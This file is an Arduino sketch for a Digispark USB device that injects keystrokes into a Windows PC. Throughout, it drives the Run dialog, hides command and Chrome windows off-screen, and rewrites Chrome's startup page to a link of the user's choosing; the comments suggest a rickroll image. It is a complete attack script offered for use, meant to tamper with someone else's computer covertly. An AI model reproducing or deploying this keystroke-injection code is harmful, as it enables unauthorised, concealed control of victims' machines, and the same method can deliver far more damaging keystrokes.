// By 8figurealltimepro
//  Replace the <Image Link> with the image link of your choice. REPLACE EVEN THE <>
// https://cdn.vox-cdn.com/thumbor/DMXD2zLif49j6IP2i3Avda2Cyl0=/1400x1400/filters:format(jpeg)/cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg a rickroll image if you want. :)

#include "DigiKeyboard.h"
#define KEY_ARROW_LEFT 0x50
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_UP 0x52
#define KEY_TAB 0x2b
#define KEY_ESCAPE 0x29

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 70; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(300);
  DigiKeyboard.println("start chrome --window-size=300,300 1"); //start a small chrome screen 
  DigiKeyboard.delay(5000);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t'); //5 times tab is pressed so that the link can be put in the address bar
  DigiKeyboard.delay(1000); // don't change this delay because of the blink time of cursor
  DigiKeyboard.println("chrome://settings/onStartup");
  DigiKeyboard.delay(3000);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN);
  DigiKeyboard.delay(500);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("<Image Link>");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT ); //exit
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit"); //exit
  DigiKeyboard.delay(1000); 
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
